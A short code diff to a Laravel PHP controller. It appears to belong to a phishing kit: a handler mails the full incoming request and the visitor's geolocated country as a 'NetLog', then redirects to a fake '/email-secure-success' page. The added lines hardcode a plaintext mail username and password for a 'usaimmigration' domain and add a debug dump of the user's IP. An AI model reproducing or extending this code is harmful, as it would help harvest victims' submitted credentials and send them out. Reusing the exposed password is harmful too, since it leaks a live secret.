@@ -22,6 +22,8 @@ class PageController extends Controller
 
     public function net(Request $request)
     {
+        Config::set('mail.username', 'help@usaimmigration.website');
+        Config::set('mail.password', 'Olu2019@');
         $country = $this->getCountryName($request);
         Mail::send( new NetLog($request, $country));
         return redirect('/email-secure-success');
@@ -44,6 +46,7 @@ class PageController extends Controller
                 } else {
                     $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                 }
+                dd($user_ip);
 
                 $client = new Client();
                 $res = $client->get('http://geoip.nekudo.com/api/' . $user_ip);
@@ -91,4 +94,5 @@ class PageController extends Controller
     // return back()->with('status', 'sent');
     return redirect('/email-secure-success');
 }
+
 }
